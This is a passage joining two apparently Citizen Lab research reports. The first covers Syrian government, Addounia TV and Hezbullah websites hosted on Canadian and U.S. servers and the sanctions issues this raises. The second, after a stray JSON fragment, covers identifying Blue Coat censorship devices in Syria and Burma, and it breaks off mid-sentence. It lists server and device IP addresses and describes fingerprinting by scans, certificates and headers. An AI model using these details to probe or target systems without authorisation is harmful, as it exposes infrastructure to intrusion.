Al-Manar on its Specially Designated Nationals List, a list of entities with which U.S. persons are generally prohibited from dealing, and the assets of which are blocked. Canada currently classifies Hezbullah as a terrorist organization. In 2006 and 2008 there were reports of separate incidences of the Al-Manar website found hosted on Canadian providers.11\nEach of these cases presents a variety of ethical, practical, and legal issues with significant human rights implications. We conclude this report with a discussion of the relevant ethical considerations and legal issues that arise from our research, and an open discussion of the challenges these cases pose for academia, civil society, the private sector, and policy makers.\nSyrian government websites hosted on Canadian web servers\nIn 2009, the ONI reported that Syria was implementing Internet filtering with a product called ThunderCache, produced by a firm called Platinum Incorporated.12 Reporters Without Borders has identified the Syrian Telecommunications Establishment (STE) and Syrian Information Organization (SIO) as clients who use the ThunderCache system.13\nPlatinum Inc. is a software development and network application developer currently based in Damascus, Syria. Founded in 1991, the company has worked in a variety of markets, including the provision of hosting services, and claims to have used co-located servers in Vancouver, Canada.14 We found that the company has registered an IP block through Rackforce, a Kelowna, B.C.-based co-location provider.15 Platinum Inc. is either owned by or affiliated with another company16, The Kernel, which is headquartered at the following address:\nDubai Airport Free Zone\nBuilding 6EA,\nOffice #209\nDubai – United Arab Emirates\nPhone: +971 4 7017 26017\nPlatinum Inc. hosts their corporate website (http://platinum.sy) through iWeb, a Montreal-based hosting company.18 In the course of our research we found more than 100 other domains also hosted at this same IP address, many of which are Syrian companies and organizations. This list includes the websites of a number of Syrian government ministries and agencies. Many of these Syrian government websites indicate that they are “Powered by Platinum Inc.,” including the Ministry of Social Affairs and Labor19 and the Ministry of Transport20. Several other government websites hosted within Syria also include the phrase “Powered by Platinum Inc.,” including the Syrian Telecommunications Establishment (Syrian Telecom)21 and Syrian Renewable Energy.22\nThis process led us to investigate other Syrian government websites that are hosted in Canada. Our research has uncovered a total of 17 Syrian government websites hosted through Canadian hosting providers (Table 1).\nTable 1: Syrian Government Websites Hosted in Canada\n\n\n\nDepartment/Agency\nHostname\nHosting country\nHosting provider\nIP address\n\n\nMinistry of Culture\nwww.moc.gov.sy\nCanada\niWeb\n174.142.53.8\n\n\nMinistry of Electricity\nwww.moe.gov.sy\nCanada\nRackforce\n209.97.212.140\n\n\nMinistry of Transport\nwww.mot.gov.sy\nCanada\niWeb\n174.142.53.8\n\n\nMinistry of Electricity (Branch Office)\nwww.damasreef-elec.gov.sy\nCanada\niWeb\n67.205.85.166\n\n\nMinistry of Social Affairs and Labor\nmolsa.gov.sy\nCanada\niWeb\n174.142.53.8\n\n\nSyrian Patent Office (Ministry of Economy & Trade)\nwww.spo.gov.sy\nCanada\niWeb\n209.172.50.157\n\n\nMinistry of Irrigation\nirrigation.gov.sy\nCanada\niWeb\n174.142.53.8\n\n\nThe Directorate-General of Antiquities and Museums\nwww.dgam.gov.sy\nCanada\niWeb\n174.142.53.8\n\n\nPublic Establishment for Electrical Generation and Transfer (Ministry of Electricity)\npeegt.gov.sy\nCanada\niWeb\n174.142.53.8\n\n\nCity of Homs\nhoms-city.gov.sy\nCanada\niWeb\n67.205.85.166\n\n\nIndustrial Research and Testing Center\nitrc.gov.sy\nCanada\niWeb\n174.142.53.8\n\n\nCity of Deirezzor\ndeirezzor-city.gov.sy\nCanada\niWeb\n67.205.85.166\n\n\nPalmyra City\npalmyra-city.gov.sy\nCanada\niWeb\n67.205.85.166\n\n\nOld City of Damascus\nwww.old-damascus.gov.sy\nCanada\niWeb\n67.205.85.166\n\n\nLatakia\nwww.latakia-city.gov.sy\nCanada\niWeb\n67.205.85.166\n\n\nGovernorate of Raqqa Website\nwww.raqqa.gov.sy\nCanada\niWeb\n184.107.58.236\n\n\nTartous City\ntartous-city.gov.sy\nCanada\niWeb\n67.205.85.166\n\n\n\nWe also discovered that a number of other Syrian government websites are hosted by providers in the United States and Germany (Table 2).\nTable 2: Syrian Government Websites Hosted in the United States and Germany\n\n\n\nDepartment/Agency\nHostname\nHosting Country\nHosting Provider\nIP Address\n\n\nMinistry of Economy and Trade\nwww.syrecon.gov.sy\nUnited States\nSoftLayer23\n174.120.51.2\n\n\nMinistry of Finance\nsyrianfinance.gov.sy\nUnited States\nSoftLayer\n70.84.218.92\n\n\nMinistry of Agriculture and Agrarian Reform\nmoaar.gov.sy\nUnited States\nHopOne Global\n209.160.33.125\n\n\nMinistry of Endowment (Religious Affairs)\nwww.mow.gov.sy\nUnited States\nHost Dime\n66.7.198.11\n\n\nGeneral Commision for Competition and Antimonopoly\nwww.competition.gov.sy\nUnited States\nSoftLayer\n174.120.51.2\n\n\nExport Development and Promotion Agency\nedpa.gov.sy\nUnited States\nServer Central\n216.246.46.101\n\n\nGovernorate of Hama Website\nwww.hama.gov.sy\nUnited States\nWeHost WebSites\n72.18.131.37\n\n\nAleppo Wakf (Endowment Website)\naleppowakf.gov.sy\nGermany\nStrato Hosting\n85.214.127.204\n\n\nGeneral Syrian Authority for Books\nsyrbook.gov.sy\nGermany\nGiga Hosting\n193.200.241.24\n\n\n\nSyrian Addounia TV hosted on Canadian web servers\nAddounia TV is a Syria-based private television station owned by a group of seven business people closely connected with the regime.24 Since the beginning of the democratic demonstrations in Syria, activists have accused Addounia TV of inciting sectarianism, violence and the use of force against the peaceful protesters.25 They have also accused it of siding with the Syrian regime and marketing its propaganda about the uprisings.26 Pro-revolution websites have archived clips from Addounia TV as examples of incitement of violence. For instance, the Syrian Revolution News website syrrevnews.com posted a clip from Addounia TV in which a guest calls on the Syrian authorities to use decisive force against protesters to end the demonstrations immediately.27 An Arabic Facebook page, apparently run by Syrians, campaigns to have two key Arab satellites (ArabSat and NileSat) discontinue carrying Addounia TV.28\nAddounnia TV has also been involved in disseminating disinformation meant to obfuscate the nature and seriousness of the violence in Syria. For example, in a September 9, 2011 broadcast, Addounia TV argued that the Doha-based Al Jazeera network staged protests in “cinematic replicas” of Syrian cities built in Qatar in order to fabricate the uprisings.29\nAddounia TV and Canadian servers\nAddounia TV has registered at least two domains: addounia.tv and addounia.org. Both domains were originally registered in 2006 by Platinum, Inc. and are currently registered at the same Dubai address mentioned above.30 Both domains display the same content and point to addounia.tv, which is hosted in Canada by iWeb Technologies.31\nAddounia TV’s website includes functionality to stream direct video content of the station’s broadcasts. These webstreams originate from 38.96.148.40 and are hosted by U.S.-based Cogent Communications.32\nAddounia TV and Hacking Activities\nAs a result of Addounia TV’s controversial role in the current uprisings its website has been targeted by pro-revolution hackers. In a recent Information Warfare Monitor report, Syrian Electronic Army: Disruptive Attacks and Hyped Targets, we documented Addounia TV’s website as one of four pro-Syrian regime websites targeted by Denial of Service (DoS) software that was re-purposed by pro-revolution hackers. The software was originally designed to target international media websites, including Al Jazeera and BBC News, by pro-Syrian regime hackers who claimed the news organizations spread biased and hostile information about the protests in Syria.33\nWe have also documented instances of pro-Syrian regime hackers defacing several Arab and Western websites, replacing their default page with that of the Addounia TV page, and inserting links to the live TV webstream. These defacement attacks were conducted after the European Union imposed sanctions on Addounia TV.\nThe defacement message read:\n“This site has been compromised to respond to the sanctions imposed by the European Union on the Addounia channel.”\nThis message can be seen on the Doha-based Shafallah Medical Genetics Center (http://smgc.org.qa/) (Figure 1).\n\nFigure 1. Screenshot of the defaced Shafallah Medical Genetics Center website\nHezbullah in Canada\nBackground about Al-Manar\nAl-Manar (the Beacon), the Lebanon-based satellite television broadcaster which is the official media arm of Hezbullah, has generated much debate in light of its controversial content.34 Canada currently classifies Hezbullah as a terrorist organization.35 Additionally, the U.S. includes Al-Manar on its Specially Designated Nationals List, a list of entities with which U.S. persons are generally prohibited from dealing, and the assets of which are blocked.36\nAl-Manar and Canadian servers\nIn 2006 it was reported that iWeb had been “hacked” by Hezbullah in order to use the provider to host their content.37 While denying that they had been compromised by attackers, iWeb acknowledged that their servers had been used to host Al-Manar and stated that once they became aware of the issue they notified their client and the site was removed.38\nIn 2008, the CBC reported that websites affiliated with Hezbullah and Hamas were being hosted on iWeb. Initial take down requests were not successful. However, after the CBC translated Arabic content on a discussion forum found on one of the sites and contacted iWeb claiming that the content could be considered a violation of Canadian anti-terrorism legislation, the websites were removed. Nart Villeneuve’s commentary on the story explains that it was unclear which specific sites were taken down, but the sites for Al-Manar (www.almanar.com.lb) and Hamas run Al-Aqsa TV (www.aqsatv.ps) were both previously hosted on iWeb.39 In reaction to the CBC story and take down request, iWeb issued a statement that noted “two websites that promote the activities of suspected terrorist organizations had indeed found their way onto iWeb’s infrastructure; however these sites were shut down as soon as this was confirmed”.40 In response to follow-up inquires made by Villeneuve regarding the specific websites in question iWeb explained “we cannot go into the specific details of this situation.”41\nCitizen Lab research has shown that Al-Manar’s primary website is still being hosted in North America. Almanar.com.lb is currently hosted in a round robin DNS configuration42 by three different hosting providers: SoftLayer and Vault Networks in the U.S. and iWeb Technologies in Canada.43 Like Addounia TV, Al-Manar offers video streaming of its live broadcasts. Citizen Lab researchers ran packet captures to confirm that all video content is being streamed from 72.55.164.21, an IP address in the iWeb Technologies address space. Al-Manar has an additional domain (http://almanarnews.net) that is also hosted in round robin DNS configuration on three U.S.-based hosting providers: SoftLayer, Vault Networks and MegaNET.44\nHezbullah’s media operations also include a radio station called Al-Nour (http://www.al-nour.net/) that broadcasts from Lebanon and offers audio streaming of its live broadcasts. Like Al-Manar, the U.S. includes Al-Nour on its Specially Designated Nationals List.45 Citizen Lab researchers have found that the Al-Nour website is hosted on U.S. web host Tiggee, while the radio stream is hosted by another U.S.-based web host, Sago Networks (66.111.34.191).46 We have also found additional Hezbullah-associated websites hosted on U.S. web servers. For example, the website of “Islamic Resistance In Lebanon – Hezbullah” (http://moqawama.org) — which refers to itself as the “official website of the Islamic Resistance in Lebanon” — is hosted by U.S. web host Tiggee as well.47\nEthical and Legal Issues\nThe existing legal and regulatory framework applicable to the provision of web hosting services by private companies is limited, and short on guidance with respect to prevention of misuse of services by repressive regimes. Debate and resulting legislation thus far has focused primarily on the issue of intermediary liability, which concerns a web host’s responsibility for content uploaded by a client that may constitute hate speech, incitement to violence, or other illegal content.48 Precedent and legislation in jurisdictions such as Canada and the U.S. has established that a web host is typically not liable for such content, provided the company responds promptly to take-down requests.49\nHowever, separate and apart from any assessment of the legality of content — which is largely outside the scope of this report — is the issue of provision of services in the first instance by private companies in liberal democratic countries to entities owned or controlled by, or otherwise affiliated with, repressive regimes. On this matter, the legal framework applicable to web hosting companies is less clear, though the human rights consequences of that provision of services may be significant — particularly as the importance of a government’s online presence and activities to its overall strategy, policies, and very existence continues to grow.\nWhen it comes to the question of engaging in business with an entity associated with a repressive regime, the primarily applicable set of laws and regulations are those that concern sanctions. Sanctions imposed by Canada against Syria currently list 56 individuals and 21 entities — including Addounia TV — as “designated persons” to which Canadian persons are prohibited from making goods available, given these individuals’ and entities’ close ties to the Syrian regime.50 However, it is unknown whether providing hosting services to an entity on the “designated person” list would constitute provision of “goods” in violation of the regulations, and, if so, whether any of the web hosting services cited in this report may have applied for a permit to conduct such business as delineated in the Special Economic Measures (Syria) Permit Authorization Order.51\nThe existence of sanctions against Syrian entities like Addounia TV, however, should itself prompt some inquiry from web hosting services as to the human rights implications of providing an online platform to organizations associated with the Syrian regime. Like Canada, the U.S. and the EU also impose sanctions against Syria, which merits additional consideration regarding the significance of the human rights violations occurring in the country. The U.S. sanctions widely prohibit export or re-export of U.S. products to Syria,52 including “the direct or indirect exportation of web-hosting services that are for purposes other than personal communications (e.g., web-hosting services for commercial endeavors) or of domain name registration services.”53 In May 2011, the EU enacted its own strict sanctions against Syria, noting that, “[i]n view of the seriousness of the situation, restrictive measures should be imposed against Syria and against persons responsible for the violent repression against the civilian population in Syria.”54\nThe EU has continued to expand these sanctions, which require, inter alia, the freezing of funds and economic resources of designated individuals and entities affiliated with the regime, as well as non-provision of such funds and economic resources going forward.55 On September 23, 2011, the Council of the European Union added Addounia TV to its list of sanctioned individuals and entities, on the basis that Addounia TV had “incited violence against the civilian population in Syria.”56 Addounia TV, on the other hand, condemned its inclusion by the EU on the sanctions list, asserting that the station was neutral in its coverage.57 Thus, while compliance with complex sanctions regulations by web hosting services raises a number of issues (see discussion below), this is an area that web hosting companies will increasingly face.\nFinally, anti-terrorism legislation is also relevant to assessing the legality of providing web hosting services to certain entities — including Hezbullah. Canada employs three terrorist listing mechanisms to designate individuals and entities subject to anti-terrorism measures: the United Nations Al-Qaida and Taliban Regulations, the Regulations Implementing the United Nations Resolutions on the Suppression of Terrorism, and the Criminal Code, pursuant to which have been adopted Regulations Establishing a List of Entities.58 The latter regulations designate Hezbullah as an entity that “has knowingly carried out, attempted to carry out, participated in or facilitated a terrorist activity or is knowingly acting on behalf of, at the direction of or in association with an entity that has knowingly carried out, attempted to carry out, participated in or facilitated a terrorist activity.”59 (Hezbullah is also designated a terrorist organization by the U.S.).60 Under section 83.18 of the Criminal Code, it is an indictable offense to knowingly participate in or contribute to — directly or indirectly — any activity of a terrorist group, including listed entities.61 Inclusion of individuals or entities on such lists may also raise due process concerns — for example, regarding what criteria and evidence were employed for inclusion of a person or group, or the ability to challenge a listing decision — yet web hosting companies are obligated to comply with the anti-terrorism laws of their own jurisdiction.\nDiscussion and Next Steps\nThe cases discussed in this report underscore the very complex, highly nuanced, and globally distributed world of web hosting. Organizations resident in one political jurisdiction of the world can have their content and websites hosted and streamed from an entirely different region of the world, and sometimes several, and be subject to the laws of those political jurisdictions. As more social, political, and economic life takes place online, pressures have grown on web hosting companies from a variety of quarters to remove or refrain from hosting particular organizations and their content. There have been numerous instances of content removal taking place without proper due process or accountability. It is imperative that the conditions under which content is removed from web hosting platforms be given careful scrutiny, that vigilantism is avoided, and that any removal be in line with due process and proper oversight and accountability.\nThe online presence on Canadian servers of numerous Syrian and other entities that have compromised international human rights raises difficult questions. What is the appropriate course of action when a Canadian- or U.S.-based web hosting service contracts with an entity owned or controlled by a repressive regime with a track record of human rights abuse? A solution is not clear cut, and no existing legal or regulatory framework appears to adequately account for the problem presented. Nor is it necessarily a simple matter for a web hosting company to gauge with whom they are contracting when entities in question may use intermediaries to undertake contracts on their behalf.\nThis report urges governments, web-hosting services, and civil society organizations to engage in greater dialogue about how to prevent provision of an electronic “safe haven” to regimes that use such resources in violating human rights. While drawing on the current sanctions regime may be an appropriate starting point, further consideration is essential to avoid subjecting legitimate expression to unwarranted takedown or to impose unrealistic demands on web hosting companies to “police the Internet.”\nOn the one hand, as a matter of public policy, providing an online platform to a government that engages in well-documented and ongoing human rights abuses could significantly exacerbate such abuses — particularly if government entities use that online space to incite violence, as appears to be the case with Addounia TV. On the other hand, how should a web hosting company go about determining when its potential clients present such human rights concerns? What if the client is an intermediary, obfuscating whom they represent? There is a risk that web hosting providers will overcompensate when it comes to screening entities that may expose them to reputational or legal liability, and possibly refuse to provide services to legitimate organizations, thereby also creating a negative human rights impact.\nMoreover, reactive take-downs by web hosts may not account for due process considerations and may compromise legitimate users. They are also not effective in preventing misuse of the resource in the first instance. The concept of enforcing “intermediary liability” has been a subject of much debate, but web hosts are typically not called upon to take action without first receiving a (possibly illegitimate) take down request.62\nWhile imperfect, the existence of a sanctions regime with respect to Syria creates at least some set of guidelines for web host companies to follow. As part of such a regime, a designated persons list is key in that it will inform a clear procedure for engagement or disengagement with clients, rather than leaving interpretation of the human rights record of a particular entity up to a web host that may have little or no experience in the field or familiarity with the background of a given client.\nIt is essential, however, that web hosting companies carefully assess and not misinterpret government sanctions and designated persons lists, as misinterpretation can also create negative human rights impact.63 Blanket contractual exclusions (such as “prohibited persons” clauses) covering individuals or entities that are merely located in a sanctioned country may not properly limit the measures web hosting companies pursue to avoid providing material support to repressive regimes as envisioned by sanctions regulations, and may inadvertently compromise legitimate organizations through an overly broad approach.64 The demonstrated track record of ISPs and web hosting companies so far suggests that they should not be left without guidance on how to properly implement such measures or incorporate due process mechanisms. Guidance from government institutions and civil society actors is, therefore, essential.\nIn sum, sanctions are an imperfect and relatively blunt instrument, more so when filtered through the individual interpretations (or misinterpretations) of private companies seeking to determine compliance requirements. Moreover, the fear of sanctions penalties cannot be the only motivating factor for restricting provision of services, and is unlikely to lead to optimal outcomes. Companies should proactively consider the human rights impact of the services they provide that may enable regimes,65 as well as the associated reputational risk to the company. In addition to due diligence measures, web hosts should carefully consider the contractual language they incorporate pertaining to this issue, providing the required level of nuance, and do their best to gauge the intermediaries with whom they are contracting.\nTaken in its entirety, we hope the cases highlighted in this report will serve as inspiration to Canadians (including civil society, academia, and the private sector) and the Canadian government that a broader discussion of cyberspace policy, governance, and security is required than has taken place to date. That the Syrian government and Addounia TV host their content from servers in Canada is at minimum in contradiction to Canada’s stated foreign policy with regard to the ongoing violence in Syria, and possibly material support to a regime that is engaged in systematic violence against peaceful demonstrators. More broadly, we encourage governments, civil society, and the private sector to seriously consider how best to handle the expanding responsibilities of web hosting companies and how due process and proper accountability mechanisms can be normalized in ways that protect free speech and access to information, while avoiding support for human rights abuses and repressive regimes in ways that have arisen here in Canada.\nDownload the report [PDF] (354 KB)\nFootnotes:\n1OpenNet Initiative, “West censoring East: The use of western technologies by Middle East censors,” March 2011, http://opennet.net/west-censoring-east-the-use-western-technologies-middle-east-censors-2010-2011.

    "text": "\n\t\t\t\tDownload PDF version\nRead our update: Are Blue Coat devices in Syria “phoning home”? (January 14, 2013)\nSummary\nCitizen Lab research into the use of commercial filtering products in countries under the rule of authoritarian regimes has uncovered a number of devices manufactured by U.S.-based Blue Coat Systems in Syria and Burma. Although Blue Coat has recently acknowledged the presence of their devices in Syria, this brief contributes to previous findings of devices in the country, documents additional devices in use in Syria, and identifies Blue Coat devices actively in use in Burma. This brief urges Blue Coat to investigate these claims and take action to prevent the further use of its technology in Syria and Burma.\nBackground\nIn recent months concern has grown over the use of commercial filtering technology in Syria, particularly in light of the Syrian regime’s violent crackdown against the 2011 uprising.1 Debate has recently focused on Blue Coat Systems, a California-based manufacturer of networking technology that develops network security and optimization tools. These tools include ProxySG devices that work with WebFilter, a product that categorizes billions of web pages to permit filtering of unwanted content.2 In August 2011, the website Reflets.info announced that it would be releasing a series of blog posts concerning the use of Blue Coat devices in Syria.3 Reflets.info later documented the presence of Blue Coat devices through in-country testing.4 This work was done in collaboration with the group Telecomix, which in October 2011 released 54gb of data purporting to be log files from Blue Coat devices active in Syria.5\nFollowing the release of this information, Blue Coat initially denied that its equipment had been sold to Syria, a country to which the export or reexport of U.S. products is prohibited pursuant to U.S. sanctions (with certain limited exceptions).6 Media reports cited an unnamed Blue Coat representative who refuted the claim that the company had sold equipment to the Syrian government and stated that “under Blue Coat’s company policy, sales to countries subject to U.S. trade embargoes are not authorised.”7 Further reports quoted Blue Coat spokesperson Steve Schick as stating: “Blue Coat does not sell to Syria. We comply with U.S. export laws and we do not allow our partners to sell to embargoed countries.”8 It was also reported that the U.S. State Department was actively investigating the issue, with an unnamed official stating: “The issue of Blue Coat’s technology being used in Syria is one that the State Department is taking very seriously and is very concerned about.”9\nHowever, on October 29, 2011, Blue Coat changed course and acknowledged the use of its technology in Syria. In a report in the Wall Street Journal, the company acknowledged that 13 of its devices, initially shipped through a distributor from Dubai and destined for the Iraqi Ministry of Communications, ended up in Syria.10 The company further acknowledged that the devices had been communicating with Blue Coat-controlled servers; however, the company claimed it does not monitor the locations from which such communications originate.11 Blue Coat senior vice president Steve Daheb stated: “We don’t want our products to be used by the government of Syria or any other country embargoed by the United States.”12\nSince August 2011, Citizen Lab researchers have been conducting technical research into the presence of Blue Coat devices in Syria and in other countries under the rule of authoritarian regimes. While Blue Coat’s most recent admissions confirm a number of our findings, our research has also raised additional questions relevant to the use of Blue Coat technology for purposes that compromise internationally-recognized human rights. Our findings include the presence of additional Blue Coat devices active in Syria, as well as the presence of a number of Blue Coat devices in Burma. We urge Blue Coat to investigate these matters further in a transparent manner, and take action to prevent further use of Blue Coat technology in Syria and Burma.\nMethodology\nThis report is a continuation of past OpenNet Initiative13 (ONI) research into the use of commercial filtering technologies to implement Internet censorship, particularly the sale of commercial technologies to Internet service providers (ISPs) in countries where government policy and practice is to restrict Internet content and violate human rights.14 The objective of this research was to document empirically and from an evidential basis that such technologies were and are in use in such countries, including Syria and Burma, and were and are actively being employed to censor Internet content.\nTwo methods were employed in conducting this research. In the case of Syria, all data was gathered remotely and no field research within the country was conducted. Evidence was gathered through network scans of publicly accessible servers in the IP address ranges of the Syrian Telecommunications Establishment. In the case of Burma, research was based on data gathered from in-country field testing and research. Testers within Burma ran ONI-developed software that tested access to 1,669 URLs, both within Burma and from a country that does not filter Internet content simultaneously. The data gathered from the country with no filtering is used as a control to compare the data from the country suspected of filtering. Two lists of URLs are tested: a ‘local’ list unique to each country and a ‘global’ list tested in all countries, which allows for comparisons across countries. The global list is comprised of internationally relevant websites with a range of content including political, social, conflict / security and Internet tools. The local list is designed individually for a specific country with URLs relevant to local politics and context. These lists are samples and are not meant to be exhaustive. The results of these tests are analyzed by ONI researchers to determine if a URL is blocked and how that block is occurring.15 The results obtained from this testing were combined with publicly available data gathered from technical analysis of Burmese networks and Blue Coat’s Site Review website to develop a fuller picture of Burma’s filtering regime.16\nIn the course of this project, we carefully deliberated on the ethics of our research methods.17 Issues raised included the ethics of accessing publicly available computer systems which, it is reasonable to believe, the administrators of such systems do not want outsiders to access. We concluded that as such systems were publicly available on the open Internet, the information gathered is fair grounds for research purposes. No attempts were made to subvert security measures, discover or use user credentials, or disrupt the operation of any computer system. Furthermore, no information disclosed here contains personally identifiable information.\nThe Citizen Lab contacted Blue Coat Systems on October 27, 2011, requesting more information regarding the sale and use of Blue Coat technology in countries against which U.S. trade sanctions are imposed. As of November 9, 2011, we have received no response.\nFindings\nWhile Blue Coat has acknowledged that 13 of their devices are present in Syria, there are additional aspects of this case that warrant further discussion and raise additional questions about the use of commercial filtering technologies in Syria and other countries under the rule of authoritarian regimes.\n1. Additional Blue Coat devices present in Syria\n\nBlue Coat has claimed that there are 13 of its devices present in Syria, which were part of a shipment of 14 devices reportedly sold to the Iraqi government.18 Additional information gathered by Citizen Lab researchers and other groups indicates, however, that there are more than 13 Blue Coat devices active in the country. The website Reflets.info, in collaboration with the Telecomix group, identified upwards of 15 Blue Coat devices actively in use in Syria.19 Separate from and additional to those devices identified by Reflets, Citizen Lab has identified Blue Coat devices active on four other IP addresses belonging to the Syrian Telecommunications Establishment, which are:\n\n213.178.244.100\n213.178.244.173\n213.178.244.174\n213.178.244.175\n\nCitizen Lab identified these as Blue Coat devices through their web administration, security certificates and HTTP header data. Three of these have security certificates identifying them as Blue Coat SG8100 series devices (figure 1).\n\nFigure 1: Blue Coat device on SCS IP address [213.178.244.174]\n \nThe devices displayed “Blue Coat Systems” in their logout page (figure 2).\n\n Figure 2: “Blue Coat Systems” displayed in logout screen of device on SCS IP address [213.178.244.100]\nThe HTTP headers also identified these as Blue Coat devices (figure 3).\nFigure 3: HTTP headers of Blue Coat device on SCS IP address [213.178.244.175]\nThe HTTP headers of one device identified it as a NetCache Appliance, a product line that was purchased by Blue Coat from Network Appliance in 2006 (figure 4). 20\nFigure 4: Device identified as a NetCache appliance on SCS IP address [213.178.244.173]\nGiven these findings, it is clear that there are more than 13 Blue Coat devices currently active in Syria.\nThis information also raises questions around Blue Coat’s method of accounting for and tracking the presence of its devices in sanctioned countries. If the 13 devices referenced in Blue Coat’s statement to the Wall Street Journal are in fact “transmitting automatic status messages back to the company,” is it possible for Blue Coat to detect additional devices? If not, what explains the difference in the behaviour/visibility of these devices? Does Blue Coat intend to actively monitor for such devices in sanctioned countries in the future?\n2. Possible obfuscation of Blue Coat devices\nCitizen Lab research documented changes made in October 2011, to the names of Blue Coat devices, and traffic logs associated with these devices, which suggests an attempt to minimize information identifying usage of Blue Coat products in Syria. A publicly accessible network monitoring system on a Syrian Computer Society IP address displays usage statistics of devices identified as Blue Coat technology. Prior to October 18, 2011, this system identified a number of devices by name (“Blue Coat,” “NetApp”) on the IP addresses documented in the previous section of this brief and by other researchers.21 Those names and IP addresses are as follows:\n\nBlueCoat 213.178.244.16\nBlueCoat 77.44.210.15\nBlueCoat 213.178.244.174\nBlueCoat 213.178.244.175\nBlueCoat 77.44.210.179\nNetApp 213.178.244.5\nNetApp 77.44.210.6\nNetApp 77.44.210.176\nNetApp 213.178.244.173\nBlueCoat 77.44.210.178\n\nThe traffic data displayed on this network monitoring system indicates that the devices had been in use since at least April 2011 (figure 5).\nFigure 5: Traffic data from Syrian network monitoring system showing Blue Coat devices actively in use since April 2011.\nA second traffic monitoring system found on another SCS IP address also listed a number of Blue Coat devices (figure 6).\nFigure 6: Additional list of devices found on an alternate network monitoring system\nThis list contains many of the same device names and IP addresses as the first list, with two additional IP addresses listed. The network monitoring system indicates that both of these devices are active, with traffic data dating back to September 2011 (figures 7 and 8).\nFigure 7: Traffic data displayed by network monitoring system\nFigure 8: Traffic data displayed by network monitoring system\nInterestingly, the device names displayed by the first monitoring system changed sometime between October 14 and 18, 2011. This name change occurred shortly after the October 4 release of logs from Blue Coat devices by the Telecomix group.22 Several devices previously labeled as “BlueCoat” changed names to “Blue” or “Bue” (figure 9). Devices previously labeled as “NetApp,” another Blue Coat product, were renamed to “Net.”\nFigure 9: SCS Network Monitoring page. Image on left is before name change; image on right is after.\nFurther, all traffic data visible through the network monitoring system appears to have been removed in mid-October 2011. While traffic data had previously varied by device and dated as far back as February 2011, all devices now display traffic data beginning on October 17, 2011 (figure 10).\nFigure 10: Traffic data on traffic monitoring system; data removed as of October 18, 2011. Compare to Figure 5.\nThe device names and traffic data on the second network monitoring system have not changed as of November 8, 2011.\nThe name change and removal of traffic data so soon after the release of data by Telecomix strongly suggests an attempt to obfuscate the presence of Blue Coat devices in Syria. While it is not clear who was responsible for these changes or why no further attempts to restrict access to this information were taken, it does suggest a deliberate attempt to conceal the presence of these devices.\n3. Blue Coat devices used in Burma\nCitizen Lab researchers have documented evidence that suggests Blue Coat devices are also used to filter Internet content in Burma.23 The Burmese military junta is well-known for its serious human rights violations,24 including its repressive tactics for Internet control and surveillance.25 Burma is subject to U.S. sanctions as well, which (with certain exceptions) prohibit imports from, export or reexport of financial services to, and new investment in Burma.26 Such sanctions demonstrate the U.S. government’s intent to restrict economic activity that will support the Burmese regime. Accordingly, it is of significant concern that the evidence we have gathered suggests Blue Coat technology is also used in Burma to filter Internet traffic. Three pieces of evidence support this conclusion:\ni. ISP hostnames match Blue Coat add-on names\nBlue Coat’s ProxySG appliances work with a variety of add-on features for additional functionality. These include “WebFilter,” the tool used to filter web content; “Director,” a web tool to manage a ProxySG deployment; “Reporter,” a tool for reporting usage data; and “ProxyAV,” a malware scanning and protection tool.27\nOur research has found hostnames on the Yatanarpon Teleport domain, Burma’s primary ISP, that directly match the names of several of these add-on features:\nfw-webfilter.yatanarpon.net.mm (203.81.161.137)\nbc-director.yatanarpon.net.mm (203.81.166.14)\nreporter.yatanarpon.net.mm (203.81.166.16)\nproxyav1.tlp.yatanarpon.net.mm (203.81.166.3)\nproxyav2.tlp.yatanarpon.net.mm (203.81.166.4)28\nThe similarity of these hostnames to the names of Blue Coat products (including “BC Director”) strongly suggests there is an installation of Blue Coat technology present on Yatanarpon’s network.\nii. Network error page found in both Syria and Burma attributed to Blue Coat\nONI testing in Burma revealed that attempts to access some URLs, particularly those that are no longer active, received the message seen in figure 11:\nFigure 11: Error message received during ONI testing in Burma in August 2011.\nThis error message is nearly identical to one received as a result of tests run on the Syrian ISP SCS in October 2011, which uncovered the error page seen in figure 12:\nFigure 12: Network error page from SCS. Text is almost identical to error messages seen in Burma, shown in Figure 11.\nThere is evidence that this error message is generated by Blue Coat’s ProxySG system. An entry on the Blue Coat support forums explaining how to modify error messages displayed by ProxySG devices identifies the exact text seen in figure 11 as the default message.29\nBlue Coat’s acknowledgement that its devices are being used in Syria, and its documentation indicating that this error message is generated by a Blue Coat device, lend support to the conclusion that Blue Coat devices are active in Burma.\niii. Correlation between ONI testing data and Blue Coat’s categorization of URLs\nBlue Coat’s WebFilter filtering software works by assigning URLs to a variety of different categories, allowing system administrators the ability to block entire categories of content covering billions of URLs.30 It is possible to identify the categorization of any given URL through the use of Blue Coat’s publicly available Site Review website.31 In total, Blue Coat groups all URLs into 82 different content categories.32\nIn August 2011, ONI conducted tests of Internet filtering on Yatanarpon Teleport in Burma following the methodology described earlier in this report. Of the 1,669 URLS tested, 500 of these URLs were determined to be blocked. The results of this testing in Burma were then correlated with Blue Coat’s URL categorizations to explore which content categories were likely blocked by Yatanarpon Teleport. The Blue Coat categorization for all 1,669 URLs tested was obtained, and these categorizations were evaluated against URLs determined to be blocked in Burma.\nURLs belonging to a total of 37 Blue Coat content categories were tested in Burma. Of these 37 categories, 10 categories appeared to be blocked entirely. Within these 10 categories, a total of 330 URLs were tested, with 326 (98.8%) of these URLs found to be blocked. Table 1 shows the 10 content categories that were suspected of being blocked entirely.\n\n\n\nBlue Coat Category\nURLs found blocked\nURLs found accessible\nPercentage blocked\n\n\nPornography\n100\n0\n100%\n\n\nLGBT\n34\n0\n100%\n\n\nIntimate Apparel/Swimsuit\n29\n0\n100%\n\n\nSex Education\n25\n0\n100%\n\n\nAdult/Mature Content\n24\n0\n100%\n\n\nNudity\n11\n0\n100%\n\n\nMalicious Outbound Data / Botnets\n6\n0\n100%\n\n\nEmail\n33\n1\n97.1%\n\n\nHacking\n29\n1\n96.7\n\n\nProxy Avoidance\n35\n2\n94.6%\n\n\nTotal\n326\n4\n98.8%\n\n\n\nTable 1: The proportion of URLs blocked in Burma belonging to 10 categories suspected of blocking\nThe strong correlation between Blue Coat’s categorization of these URLs and those URLs found blocked during ONI testing provides further evidence that Blue Coat’s devices are actively used to filter Internet content in Burma. While not definitive, it is unlikely that this correlation would be as strong were Burma to use an alternative filtering system.\nIt is not clear why four URLs belonging to these 10 categories were not found to be blocked in ONI testing. There are several explanations. First, past testing by ONI has found blocking on this ISP to be intermittent and inconsistent; it is possible that these instances were simply the result of random error.\nSecond, two of these four URLs used HTTPS rather than 